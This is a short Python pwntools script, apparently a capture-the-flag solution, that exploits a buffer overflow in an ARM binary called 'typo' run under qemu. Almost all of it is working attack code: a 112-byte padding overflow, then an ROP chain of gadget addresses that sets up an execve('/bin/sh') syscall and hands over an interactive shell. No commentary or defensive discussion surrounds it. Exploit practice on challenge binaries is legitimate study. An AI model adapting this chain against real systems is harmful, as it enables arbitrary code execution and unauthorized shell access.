from pwn import *
context(arch='arm',log_level='debug')
io = process(['qemu-arm','./typo'])
#io = process(['qemu-arm',"-g","1234",'./typo'])

io.recv()
io.send("\n")
io.recv()

payload = b'a'*112
payload += p32(0x00068bec) #pop {r1, pc}
payload += p32(0)
payload += p32(0x00020904) #pop {r0, r4, pc} 
payload += p32(0x0006c384) #/bin/sh
payload += p32(0)
payload += p32(0x00014068) #pop {r7, pc} 
payload += p32(0xb)
payload += p32(0x00008160) #pop {r3, pc}
payload += p32(0x000482fc) #svc #0 ; pop {r7} ; bx lr
payload += p32(0x0003338c) #mov r2, r4 ; blx r3

io.sendline(payload)
io.interactive()
